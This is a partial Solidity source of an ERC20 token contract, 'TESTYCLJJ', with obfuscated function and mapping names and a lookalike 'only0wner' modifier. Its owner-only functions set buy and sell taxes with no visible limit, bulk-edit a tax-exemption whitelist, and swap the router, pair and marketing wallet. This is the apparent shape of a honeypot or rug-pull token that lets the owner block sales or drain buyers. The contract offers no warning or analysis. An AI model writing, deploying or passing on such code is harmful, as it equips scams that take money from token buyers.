...
contract TESTYCLJJ is ERC20, Ownable{
    ...
    mapping (address => bool) public NATBBCClfvnGaa;
    ...
    constructor() ERC20("TESTYCLJJ", "TESTYCLJ") {
        ...
        NATBBCClfvnGaa[msg.sender] = true;
        NATBBCClfvnGaa[address(pair)] = true;
        NATBBCClfvnGaa[marketingWallet] = true;
        NATBBCClfvnGaa[address(router)] = true;
        NATBBCClfvnGaa[address(this)] = true;
    }
    ...
    function gdOhuiEFwFaGC(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function PUVlvfYvoDPePzX(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            NATBBCClfvnGaa[accounts[i]] = newValue;
        }
    }

    function uPPPFDxDLdNRR(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function iTYDYsvtSIovh(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function LtjJNNWCBDp(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function OELJYsARHIGgn(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
